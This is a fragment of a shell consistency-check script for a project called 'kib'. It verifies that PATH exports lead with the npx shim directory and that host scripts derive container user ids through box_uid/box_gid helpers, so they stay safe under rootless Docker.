elif [ "${_path_exports:-0}" -eq 0 ] || [ "$_path_exports" != "$_shim_first" ]; then
    fail "a PATH export does not lead with \$KIB_SHIM_DIR ($_shim_first of $_path_exports do)" \
        "a pinned node's bin then shadows the npx shim and Chrome launches sandboxed"
else
    # shellcheck disable=SC2016  # ditto: \$d is the shim's variable, not this script's
    is "the npx shim skips itself by its own dir" "$_shim_dir/npx" \
        "$(sed -n 's|.*\[ "\$d/npx" != \([^ ]*\) \].*|\1|p' "$_ep")"
fi
unset _ep _shim_dir _path_exports _shim_first

# ── The box's ids go through box_uid/box_gid ─────────────────────
# Under rootless Docker the host user maps to container uid 0, so a bare `id -u` in a --user,
# HOST_UID, gosu or FUSE-remap position names an unmapped subuid (100000+) that can read none of
# kib's own mounts. It fails as EACCES on a path that plainly exists — no message names the uid —
# so the drift is caught here instead. host/portable.sh is where the two shims live.
# (docs/design-notes/platform-matrix.md § Rootless)
_bare_ids=""
for _f in host/redaction.sh host/lifecycle.sh host/desktop.sh host/broker.sh host/node.sh; do
    _hits="$(sed 's/#.*$//' "$KIB_ROOT/$_f" \
        | grep -nE -- '(--user|--uid|--gid|HOST_UID|HOST_GID|gosu)[^#]*\$\(id -[ug]\)' || true)"
    [ -n "$_hits" ] && _bare_ids="$_bare_ids $_f"
done
if [ -n "$_bare_ids" ]; then
    fail "a container id still comes from a bare \$(id -u):$_bare_ids" \
        "use box_uid/box_gid — they answer 0 under rootless, where 0 IS the host user"
else
    pass "every container id goes through box_uid/box_gid (rootless-safe)"
fi
unset _bare_ids _f _hits
